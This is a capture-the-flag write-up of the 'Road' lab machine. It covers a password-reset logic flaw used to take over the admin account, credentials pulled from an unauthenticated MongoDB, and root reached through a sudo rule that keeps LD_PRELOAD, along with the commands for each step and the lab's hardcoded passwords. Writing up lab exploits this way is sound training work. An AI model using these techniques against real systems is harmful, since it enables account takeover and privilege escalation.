# Road

## 1. Introduction

### 1.1 Background

The **Road** machine presents an exploitation chain focused on logic flaws in web applications, exposure of internal services, and an insecure `sudo` configuration that allows privilege escalation.

Full system compromise was achieved by chaining multiple vulnerabilities from the web layer to the operating system.

### 1.2 Objectives

The objectives of the analysis were:

- Identify vulnerabilities in the web application.
- Obtain initial access to the system.
- Escalate privileges to root.
- Document the complete exploitation chain.

---

## 2. Enumeration

### 2.1 Port Scanning

A full scan was performed:

```
nmap -sCV -p- <IP>
```

Relevant detected ports:

- 22/tcp – SSH  
- 80/tcp – HTTP  

The web server reported:

```
Apache/2.4.41 (Ubuntu)
```

### 2.2 Web Enumeration

In the web application, the following endpoint was identified:

```
/v2/lostpassword.php
```

By intercepting the request with Burp Suite, the following was observed:

```
POST /v2/lostpassword.php

uname=<email>
npass=<password>
cpass=<password>
ci_csrf_token=
```

The CSRF token was sent empty and there was no validation of the recovery flow.

### 2.3 Code Analysis

From the shell obtained later, the source code was reviewed:

```
$con = mysqli_connect('localhost','root','ThisIsSecurePassword!');
```

Hardcoded credentials were identified in the code.

### 2.4 Internal Service Enumeration

Local services were listed:

```
ss -tulnp
```

MongoDB was detected at:

```
127.0.0.1:27017
```

Access without authentication:

```
mongo
```

Available databases:

```
admin
backup
config
local
```

In the `backup` database:

```
db.user.find()
```

Relevant result:

```
{
  "Name": "webdeveloper",
  "Pass": "BahamasChapp123!@#"
}
```

---

## 3. Exploitation

### 3.1 Password Reset Logic Vulnerability

The endpoint allowed modifying the password of any user by directly sending:

```
uname=admin@sky.thm
npass=<new_password>
cpass=<new_password>
```

Without token validation or email confirmation.

This allowed taking control of the administrative account.

### 3.2 Obtaining Shell

From the administrative panel, remote command execution was achieved, obtaining access as:

```
www-data
```

### 3.3 Pivot to Local User

Using the credentials found in MongoDB:

```
BahamasChapp123!@#
```

We executed:

```
su webdeveloper
```

Successful access to the `webdeveloper` user.

---

## 4. Post-Exploitation

### 4.1 Sudo Enumeration

```
sudo -l
```

Result:

```
(ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
env_keep+=LD_PRELOAD
```

The system allowed preserving the `LD_PRELOAD` variable when executing the binary as root.

### 4.2 Privilege Escalation

The presence of:

```
env_keep+=LD_PRELOAD
```

Allowed loading a custom shared library when executing:

```
sudo LD_PRELOAD=<library> /usr/bin/sky_backup_utility
```

This enabled execution of code with root privileges and obtaining a privileged shell.

Verification:

```
whoami
```

Result:

```
root
```

### 4.3 Flags

- `/home/webdeveloper/user.txt`  
- `/root/root.txt`
